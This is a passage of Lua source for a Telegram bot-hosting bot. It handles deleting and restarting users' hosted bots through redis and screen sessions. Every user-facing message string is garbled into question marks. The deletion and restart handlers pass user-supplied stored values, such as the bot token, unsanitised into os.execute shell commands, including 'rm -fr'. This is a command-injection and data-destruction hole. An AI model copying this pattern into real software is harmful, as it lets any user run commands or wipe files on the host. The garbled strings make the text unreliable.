if redis:get(bot_id..":Bot:"..msg.sender.user_id) then
return LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???????? ?????? ???? ???????????? ???????????? .*', 'md')
else
redis:set(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id,'true') 
return LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ???????????? ???????? ?????????? ???????? :*',"md", false, false, false, false, reply_markui)
end
else
return LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???????? ?? ???? ?????????? ?????????? ?????????????? ???? ???????? ???????? ??????????  ???????? ???? ?????? ?????????? ???? ???????? ?????????? ???? ???????????? \n - ?????? ?????????? : @--*', 'md', false, false, false, false, reply_markun)
end
end
if text and redis:get(bot_id.."Del:S:Bot"..msg.chat_id..":"..msg.sender.user_id) == 'true' then
if text == '?????????? ???' then
local t = '*?????? ???? ?????????? ?????????? ??????????*'
redis:del(bot_id.."Del:S:Bot"..msg.chat_id..":"..msg.sender.user_id) 
LuaTele.sendText(msg.chat_id,msg.id,t, 'md', false, false, false, false, reply_markun)
return false  
end 
os.execute('screen -S '..redis:get(bot_id..":Bot:"..msg.sender.user_id)..' -X kill')
os.execute('cd && rm -fr '..redis:get(bot_id..":Bot:"..msg.sender.user_id))
redis:del(bot_id..":Bot:"..msg.sender.user_id)
redis:del(bot_id.."Del:S:Bot"..msg.chat_id..":"..msg.sender.user_id) 
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ?????? ???????????? ?????????? ??????????*', 'md',false, false, false, false, reply_markun)
end
if text == '?????? ?????????? ???' then
if redis:get(bot_id..":Bot:"..msg.sender.user_id) then
redis:set(bot_id.."Del:S:Bot"..msg.chat_id..":"..msg.sender.user_id,'true')
return LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ?????? ?????????? ???? ?????? ???????? .??*', 'md', false, false, false, false, reply_markuk)
else
return LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???????? ???? ?????????? ?????? ???????????? .*', 'md', false, false, false, false, reply_markun)
end
end
if text == '?????? ???? ???' then
if redis:get(bot_id..":Bot:"..msg.sender.user_id) then
u , res = https.request('https://api.telegram.org/bot'..redis:get(bot_id..":Bot:"..msg.sender.user_id)..'/getMe')
JsonSInfo = JSON.decode(u)
UserBot = string.upper(JsonSInfo['result']['username'])
os.execute('screen -S '..UserBot..' -X kill')
os.execute('cd && cd '..UserBot..';screen -d -m -S '..UserBot..' lua5.3 Snaybir.lua')
return LuaTele.sendText(msg.chat_id,msg.id,'*?????????? ?????????? ?????????? ?????????? . .*', 'md')
else
return LuaTele.sendText(msg.chat_id,msg.id,'?????????????? ???? ?????????? ?????? ???????? ???? .', 'md', false, false, false, false, reply_markun)
end
end
end --- end not Devloper
end --- end type == "basicgroup"
end --- end Run(
----------------------------------------------------------------------------------------------------------------------------------------------------------------
function Call(data)
if data and data.luatele and data.luatele == "updateNewMessage" then
if data.message.sender.luatele == "messageSenderChat" then
return false
end
if tonumber(data.message.sender.user_id) ~= tonumber(bot_id) then  
print(serpent.block(data, {comment=false}))  
Run(data.message,data)
end
elseif data and data.luatele and data.luatele == "updateMessageEdited" then
local msg = LuaTele.getMessage(data.chat_id, data.message_id)
if tonumber(msg.sender.user_id) ~= tonumber(bot_id) then  
Run(msg,data)
end
elseif data and data.luatele and data.luatele == "updateNewCallbackQuery" then
---Callback(data)
elseif data and data.luatele and data.luatele == "updateMessageSendSucceeded" then
end --- end data
end --- end Call( 
----------------------------------------------------------------------------------------------------------------------------------------------------------------
luatele.run(Call)
